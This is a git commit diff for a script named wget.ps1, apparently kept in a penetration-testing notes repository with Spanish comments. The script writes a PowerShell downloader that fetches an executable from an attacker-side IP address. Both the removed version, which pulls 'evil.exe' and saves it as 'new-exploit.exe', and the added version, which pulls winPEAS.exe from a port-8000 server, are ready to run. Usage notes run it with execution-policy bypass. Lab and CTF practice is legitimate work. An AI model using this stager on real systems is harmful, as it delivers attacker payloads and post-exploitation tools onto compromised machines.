9a500061562e8ef8d08750b8c18de8b17fb1be40
PF <pedro.flor@gmail.com>
2020-07-27 00:13:01 -0400

    Update wget.ps1

--- wget.ps1
+++ wget.ps1
@@ -1,10 +1,9 @@
 ::## Cambiar: IP, "evil.exe"
-
-echo $storageDir = $pwd > wget.ps1
-echo $webclient = New-Object System.Net.WebClient >> wget.ps1
-echo $url = "http://10.11.0.5/evil.exe" >> wget.ps1
-echo $file = "new-exploit.exe" >> wget.ps1
-echo $webclient.DownloadFile($url,$file) >> wget.ps1
+echo '$storageDir = $pwd' > wget.ps1
+echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
+echo '$url = "http://10.10.14.33:8000/winPEAS.exe"' >> wget.ps1
+echo '$file = "winPEAS.exe"' >> wget.ps1
+echo '$webclient.DownloadFile($url,$file)' >> wget.ps1
 
 ::## Usar:
 ::## cmd> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
